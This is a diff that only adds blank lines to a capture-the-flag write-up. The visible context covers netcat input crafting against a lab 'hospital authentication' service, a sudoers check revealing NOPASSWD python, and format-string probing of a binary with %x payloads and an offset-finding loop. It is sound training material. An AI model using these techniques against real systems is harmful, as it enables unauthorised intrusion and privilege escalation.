@@ -170,6 +170,7 @@ if __name__ == "__main__":
 ```
 
 Output:
+
 ```
 b'{"data":[{"id":"47861","name":"Nathen Hahn","street":"65578 Christophe Ferry","email":"Jan42@hotmail.com"}]}'
 <-- snip -->
@@ -286,7 +287,9 @@ We can perform a test scan using -z and -v to let us know if it's possible to co
 `-v` Have nc give more verbose output.
 
 `$ nc -zv 10.13.37.3 7777`
+
 Output:
+
 ```
 Connection to 10.13.37.3 7777 port [tcp/cbt] succeeded!
 ```
@@ -384,7 +387,9 @@ Sorry, the status is incorrect
 Unfortunately, no. Is there any other way to make that character?
 
 `$ echo -e "\x90"`
+
 Output:
+
 ```
 É
 ```
@@ -392,7 +397,9 @@ Output:
 Now we have a way to create that character, so if we echo it normally into netcat will it run just fine?
 
 `$ echo "bbbbbbbbbbbbbbbbbbbbbbbbbbbbb" | nc 10.13.37.3 7777`
+
 Output:
+
 ```
 Welcome to the East Coast Hospital authentication system. There is only one password for this box. You can tell if you got the password correct because the status will be 144 (In decimal), and it will give you the flag. The password is at most 15 characters.
 Password: 
@@ -403,7 +410,9 @@ Sorry, the status is incorrect
 We just proved that we can pipe the echo of a normal input into netcat, so if we add the -e flag we can replace the final character with the hex character that we need in order to get the final flag.
 
 `$ echo -e "bbbbbbbbbbbbbbbbbbbbbbbbbbbb\x90" | nc 10.13.37.3 7777`
+
 Output:
+
 ```
 Welcome to the East Coast Hospital authentication system. There is only one password for this box. You can tell if you got the password correct because the status will be 144 (In decimal), and it will give you the flag. The password is at most 15 characters.
  Password: 
@@ -576,7 +585,9 @@ Flag 7 deals with the post exploitation of the box we compromised in Flag 6.
 I quickly made my way over to `/etc/sudoers`.
 
 `$ cat /etc/sudoers | grep "sshuser"`
+
 Output:
+
 ```
 sshuser ALL=NOPASSWD: /usr/bin/python
 ```
@@ -654,7 +665,9 @@ References:
 * http://www.cgsecurity.org/Articles/SecProg/Art4/
 
 `readelf -h binary`
+
 Output:
+
 ```
 ELF Header:
   Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
@@ -692,7 +705,9 @@ You are the incorrect user
 Let's give it some formats and see what we get back!
 
 `echo -e '|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x' | ./binary`
+
 Output:
+
 ```
 Hello: |40|f7697580|80482f3|0|fff7d994|0|7c78257c|257c7825|78257c78|7c78257c
 ```
@@ -700,7 +715,9 @@ Hello: |40|f7697580|80482f3|0|fff7d994|0|7c78257c|257c7825|78257c78|7c78257c
 We can see the start of our repeating block is `7c78257c`. In order to verify this, we can try and print a block of 'A's.
 
 `echo -e 'AAAA|%x|%x|%x|%x|%x|%x|%x' | ./binary`
+
 Output:
+
 ```
 Hello: AAAA|40|f7739580|80482f3|0|ff9cefa4|0|41414141
 ```
@@ -708,7 +725,9 @@ Hello: AAAA|40|f7739580|80482f3|0|ff9cefa4|0|41414141
 As we can see, the seventh block is confirmed to be the one we want to exploit. We can narrow down to the Nth position in a short string as follows:
 
 `echo -e 'AAAA|%7$x' | ./binary`
+
 Output:
+
 ```
 Hello: AAAA|41414141
 ```
@@ -720,7 +739,9 @@ for ((i = 1; i < 200; i++)); do
 	echo -e "AAAA%${i}\$x" | ./binary | grep "41414141" && echo -e "Match on line: ${i}" && break
 done
 ```
+
 Output:
+
 ```
 What is your username: Hello: AAAA41414141
 Match on line: 7
